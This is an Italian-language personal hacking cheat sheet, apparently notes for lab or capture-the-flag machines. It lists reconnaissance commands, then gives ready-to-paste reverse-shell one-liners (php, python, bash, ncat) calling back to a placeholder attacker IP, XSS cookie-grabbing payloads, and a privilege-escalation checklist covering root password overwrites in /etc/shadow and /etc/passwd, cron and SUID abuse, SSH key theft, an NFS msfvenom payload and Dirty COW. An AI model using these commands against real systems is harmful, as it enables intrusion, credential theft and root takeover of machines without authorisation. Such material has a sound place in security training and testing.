# LISTA COMANDI UTILI

1. ###### FIND
   è il comando usato per trovare un file seguendo certi criteri
	- `find /`: inizia a cercare da root
	- `-user user1`: cerca file creato da utente user1
	- `-group group1`: cerca file creato da gruppo group1
	- `-size +6c -size -10c`: cerca file con dimensione maggiore di 6byte e minori di 10 byte
	- `-perm 4000`: cerca file con permessi utente root, se 2000 file avviato con privilegi del gruppo invece, che potrebbe essere root

2. ###### SSH
   è il comando per potersi collegare ad un computer in remoto
	- `ssh username@hostname`: connettiti ad IP = hostname usando username per credenziale d'accesso
	- `-p 2020`: utilizza la porta 2020 per la connessione

4. ###### SCP
   è il comando per trasferire file usando ssh
	- `scp username@hostname:/percorso/origine /percorso/destinazione/nome_file_di_destinazione`: prendi file dalla connessione ssh e salvalo in locale con nome nome_file_di_destinazione
	- `-r`: copia una intera directory

5. ###### HOST
   è il comando utilizzato per eseguire query DNS e ottenere informazioni sui nomi di dominio.
	- **`-t ns`**: specifica il tipo di record DNS che desideri ottenere. In questo caso, "ns" sta per "nameserver", quindi stai chiedendo di ottenere informazioni sui server dei nomi del dominio
	- **`-t mx`**: specifica il tipo di record DNS richiesto, in questo caso, "mx" per i record di scambio di posta (Mail Exchange)
	- `-l hostname.com nsztm2.digi.ninja`: prova un DNS Zone Transfer, utile per altre informazioni

6. ###### WHOIS
   è il comando per vedere informazioni sul possesso di un dominio o di un indirizzo IP. Potrebbe interessarti il "Name Server" per DNS Zone Transfer
	`whois esempio.com`: vedi le informazioni di esempio.com

7. ###### NC
    utile per creare client/server rapidamente. Ottimo per mandare i comandi alla macchina che stiamo attaccando
- ```nc -l 1234```: inizia ad ascoltare nella porta 1234
- ```nc 127.0.0.1 1234```: connettiti alla macchina con indirizzo 127.0.0.1 alla porta 1234


# SHELLS
### REVERSE SHELL
Nella reverse shell è l'attacker che si mette in listening e la vittima si collega, quindi

#### ATTACCANTE:

```
ncat -lvnp 4242
```

#### VITTIMA:

##### php
```
php -r '$sock=fsockopen("IP_ATTACCANTE",4242);shell_exec("sh <&3 >&3 2>&3");'
```

##### python3
```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ATTACCANTE",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

##### bash

```
bash -i >& /dev/tcp/IP_ATTACCANTE/4242 0>&1
```

```
0<&196;exec 196<>/dev/tcp/IP_ATTACCANTE/4242; sh <&196 >&196 2>&196
```

```
/bin/bash -l > /dev/tcp/IP_ATTACCANTE/4242 0<&1 2>&1
```

##### netcat
```
ncat 10.0.0.1 4242 -e /bin/bash
```


# XSS
```<script>alert(document.cookie)</script>``` è quello che mediamente mi può interessare per idSession

1. prova a metterlo nella URL se puoi dopo il ?
2. prova a metterlo in un button come `onclick=alert(document.cookie)`
3. prova a metterlo nella URL dopo una GET/POST con `&<script>alert(document.cookie)</script>`


# PRIVILAGE ESCALATION

La guida che segue è un po' disordinata, è più una lista di metodi da provare che altro. 

0. **CALDAMENTE CONSIGLIATO** Runna [linpeas.sh] (https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) dopo averlo scaricato sulla macchina vittima
1. Controlla se il file /etc/shadow è readable, cracka la hash del root
2. Controlla se il file /etc/shadow è writable, genera una nuova password sha-512 `mkpasswd -m sha-512 newpasswordhere` e sostituiscila a root
3. Controlla se il file /etc/passwd è writable, genera una password con `openssl passwd newpasswordhere` copia la riga iniziale di root alla fine di passwd, sostituisici il primo `root:x` con `newroot:password`, cambia utente in newroot
4. Usa `sudo -l` e vedi che comandi puoi usare come root, usa [GTFOBins](https://gtfobins.github.io/) per vedere quali permettono di fare privilage escalation
5. Guarda `cat /etc/crontab`, vedi se ci sono programmi che vengono eseguiti come root e prova a modificarli per avere shell o qualcosa di simile
6. Guarda `cat /etc/crontab`, vedi il PATH e i programmi che vengono eseguiti come root, crea un programma con lo stesso nome di quello root nella prima cartella in ordine che appare in PATH che ti possa permettere di avere una shell o qualcosa di simile
7. Guarda `cat /etc/crontab`, vedi se tra  i programmi root si sono WILDCARDS \*, poi usa gli exploit adatti
8. Guarda `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`, cerca se ci sono file soggetti ad exploit da [Exploit DB](https://www.exploit-db.com/)
9. f
10. Guarda se magari nella cronologia `cat ~/.*history | less` ha per sbaglio messo la password
11. Cerca se c'è la chiave SSH da qualche parte, copiala in un file root_key, `chmod 600 root_key`, e poi prova a connetterti con questa chiave `ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@IP_VITTIMA`
12. Guarda `cat /etc/exports`, se ci sono opzioni `no_root_squash` allora puoi usare il `mount` come root per avere privilegi root nella macchina vittima. 
		 ATTACCANTE (es. su /tmp vulnerabile a no_root_squashing):
		`mkdir /tmp/nfs` 
		`mount -o rw,vers=3 IP_VITTIMA(credo):/tmp /tmp/nfs`
		`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
		`chmod +xs /tmp/nfs/shell.elf`
		VITTIMA:
		`/tmp/shell.elf`
13. Come ultima istanza, prova un Dirty COW, anche se meglio di no
